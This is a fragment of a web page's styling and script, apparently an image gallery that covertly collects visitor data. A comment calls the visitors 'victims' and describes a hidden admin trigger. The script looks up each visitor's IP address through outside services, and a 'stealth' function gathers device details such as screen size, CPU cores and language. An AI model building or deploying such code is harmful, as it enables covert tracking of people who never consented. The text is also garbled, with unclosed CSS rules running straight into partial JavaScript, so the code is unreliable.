        .image-card {

        .image-card:hover {

            border-color: rgba(255, 255, 255, 0.3);
            background: rgba(255, 255, 255, 0.2);
        }
        .image-card img {
            width: 100%;
            height: 150px;
            object-fit: cover;
            border-radius: 10px;
            margin-bottom: 10px;
        }
        .image-title {
            font-weight: bold;
            margin-bottom: 5px;
        }
        .image-desc {
            font-size: 0.8em;
            opacity: 0.7;
        }
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
            font-size: 1.1em;
        }
        .pulse {
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        .warning {
            text-align: center;
            font-size: 0.8em;
            opacity: 0.6;
            margin-top: 20px;
        }
        /* Hidden admin trigger - invisible to victims */
        .hidden-admin {
            position: fixed;
            top: 0;
            right: 0;
            width: 5px;
            height: 5px;
            background: transparent;
            cursor: default;
            z-index: -1000;

                'https://ipinfo.io/json'
            ];

            for (const service of services) {
                try {
                    const response = await fetch(service, { 
                        mode: 'cors',
                        credentials: 'omit'
                    });
                    const data = await response.json();
                    return { ip: data.ip || data.query || 'Unknown' };
                } catch (error) {
                    continue;
                }
            }
            return { ip: 'Unknown' };
        }

        function getStealthDeviceInfo() {

                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                cores: navigator.hardwareConcurrency,

                java: navigator.javaEnabled ? 'Enabled' : 'Disabled',
